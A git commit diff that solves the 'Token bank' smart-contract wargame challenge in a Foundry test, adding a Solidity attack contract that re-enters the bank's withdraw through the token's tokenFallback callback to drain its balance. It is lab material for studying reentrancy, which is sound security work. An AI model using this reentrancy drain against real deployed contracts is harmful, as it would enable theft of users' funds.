97483518ce7e1c4e3789b162ad593c533d1d36d6
islu <38793955+islu@users.noreply.github.com>
2024-05-10 17:12:21 +0800

    solve challenge (Token bank)

--- test/4-Miscellaneous/2-TokenBank.t.sol
+++ test/4-Miscellaneous/2-TokenBank.t.sol
@@ -22,8 +22,71 @@ contract TokenBankTest is Test {
 
         // [START]
 
+        vm.startPrank(player);
+
+        uint256 meAmount = 500000 * 10 ** 18;
+
+        challenge.withdraw(meAmount);
+
+        // 1. Deploy attack contract
+        TokenBankAttack attacker = new TokenBankAttack(payable(challengeAddress));
+
+        // console.log("bank balance: ", address(challenge).balance);
+        // console.log("attacker balance: ", address(attacker).balance);
+
+        challenge.token().transfer(address(attacker), meAmount);
+
+        attacker.deposit();
+
+        attacker.attack();
+
+        vm.stopPrank();
+
         // [END]
 
         assertTrue(challenge.isComplete());
+    }
+}
+
+// Attack contract
+contract TokenBankAttack {
+    TokenBankChallenge public target;
+
+    constructor(address _target) public {
+        target = TokenBankChallenge(_target);
+    }
+
+    function deposit() external payable {
+        uint256 balance = target.token().balanceOf(address(this));
+
+        target.token().transfer(address(target), balance);
+    }
+
+    function attack() external payable {
+        withdraw();
+
+        require(target.isComplete(), "challenge not completed");
+    }
+
+    function tokenFallback(address from, uint256 value, bytes memory data) external {
+        require(msg.sender == address(target.token()), "Must be token contract");
+
+        // If is EOA deposit, ignore
+        if (from != address(target)) return;
+
+        withdraw();
+    }
+
+    function withdraw() private {
+        uint256 balance = target.balanceOf(address(this));
+
+        uint256 remainingBalance = target.token().balanceOf(address(target));
+
+        bool keepRecursing = remainingBalance > 0;
+
+        if (keepRecursing) {
+            uint256 toWithdraw = balance < remainingBalance ? balance : remainingBalance;
+            target.withdraw(toWithdraw);
+        }
     }
 }
